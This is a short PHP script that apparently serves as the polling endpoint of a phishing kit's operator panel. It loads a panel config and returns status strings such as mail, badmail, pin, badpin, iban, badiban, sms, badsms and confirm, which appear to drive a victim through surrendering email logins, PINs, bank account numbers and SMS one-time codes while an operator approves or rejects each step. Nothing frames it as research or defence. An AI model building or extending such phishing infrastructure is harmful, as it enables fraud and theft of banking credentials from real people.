<?php 

require "Config/panel.php";


if( $_GET['waiting'] == 1 ) {
    $response = response();
    if( $response === 'mail' ) {
        echo 'mail';
        exit();
    }
    else if( $response === 'badmail' ) {
        echo 'badmail';
        exit();
    }
    else if( $response === 'pin' ) {
        echo 'pin';
        exit();
    } else if( $response === 'badpin' ) {
        echo 'badpin';
        exit();
    }
    else if( $response === 'iban' ) {
        echo 'iban';
        exit();
    } else if( $response === 'badiban' ) {
        echo 'badiban';
        exit();
    }
    else if( $response === 'sms' ) {
        echo 'sms';
        exit();
    } else if( $response === 'badsms' ) {
        echo 'badsms';
        exit();
    }
    else if( $response === 'confirm' ) {
        echo 'confirm';
        exit();
    }
    exit();
}